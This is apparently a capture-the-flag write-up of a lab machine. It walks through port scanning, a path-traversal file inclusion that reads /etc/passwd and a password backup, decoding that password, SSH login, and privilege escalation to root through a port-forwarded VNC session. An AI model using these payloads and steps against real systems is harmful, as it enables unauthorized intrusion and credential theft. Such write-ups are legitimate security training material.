## Enumeration

- I began with a full TCP port scan, followed by a service and version detection scan on the discovered open ports

	```python
	nmap -p- --open --min-rate 5000 -Pn -sS 10.129.1.254 -oG scan
	/opt/extractports scan
	nmap -p22,80 -Pn -sCV  10.129.1.254 -oN ports
	```

	<img width="936" height="284" alt="image" src="https://github.com/user-attachments/assets/94e83ed5-dd5f-45f8-9608-e37377eb289c" />

- The scan revealed:
	- **Port 22 – SSH**
	- **Port 80 – HTTP (Apache/PHP application)**
## Initial Access – Web Application

- Upon browsing the web application, I observed several PHP scripts accessible via a `browse.php` parameter:

	<img width="883" height="210" alt="image" src="https://github.com/user-attachments/assets/69ae78d4-688a-414d-b3d9-284a58120c40" />

	```python
	http://10.129.1.254/browse.php?file=phpinfo.php
	```

- The presence of a `file` parameter strongly suggested potential file inclusion vulnerabilities. I tested for Local File Inclusion (LFI):

	```python
	http://10.129.1.254/browse.php?file=../../../../../../../etc/passwd
	```

	<img width="870" height="564" alt="image" src="https://github.com/user-attachments/assets/b710daac-1935-4924-9711-54bb2af9cc5d" />

 - The request successfully returned the contents of `/etc/passwd`, confirming the LFI vulnerability. From the output, I identified a valid system user `charix``.

## Sensitive File Discovery

 - Among the available scripts, I noticed `listfiles.php`, which displayed output similar to an `ls` command. One file in particular drew my attention `pwdbackup.txt`. Using the LFI vulnerability, I retrieved its contents:

	```python
	http://10.129.1.254/browse.php?file=pwdbackup.txt
	```

	<img width="830" height="363" alt="image" src="https://github.com/user-attachments/assets/b26e65ac-71a6-4ae6-b6f5-efac2f500813" />

- The file indicated that the contained password was encoded 13 times in Base64. To decode it, I wrote a simple Bash script

	```bash
	#!/bin/bash
	for i in {1..13}
	do
	    base64 -d password > password.tmp && mv password.tmp password
	done
	cat password
	```

- After decoding, I obtained the plaintext password. 
- Since the user `charix` existed on the system, I attempted SSH authentication using the recovered credentials

	```python
	ssh charix@10.129.1.254
	```

- Authentication was successful, granting initial shell access. At this point, I was able to retrieve the user flag.

## Encrypted ZIP File

- Inside `charix`’s home directory, I discovered an encrypted ZIP file. Using the same recovered password, I successfully extracted its contents.

- The archive contained a file named `secret`, which appeared to contain a non-readable password-like string.

## Privilege Escalation

- To understand the system’s activity, I checked logged-in users. The output indicated that `root` was currently active.

- Next, I inspected running processes and noticed that `root` was running **Xvnc**. This suggested that a VNC server might be active locally.

- I checked listening ports and identified port **5901**, which was not externally exposed.

- Since I had SSH access, I established local port forwarding

	```python
	ssh -L 5901:127.0.0.1:5901 charix@10.129.1.254
	```

- From my local machine, I verified the forwarded port

	```python
	nmap -p5901 -Pc -sCV 127.0.0.1
	```

- The service was confirmed to be VNC

- I then attempted to authenticate using the previously extracted `secret` file as the VNC password:

	```python
	vncviewer -passwd secret 127.0.0.1:5901
	```

- Authentication was successful.

- Upon connecting, I gained access to a graphical session running as `root`, which provided direct access to a root shell. This allowed retrieval of the root flag
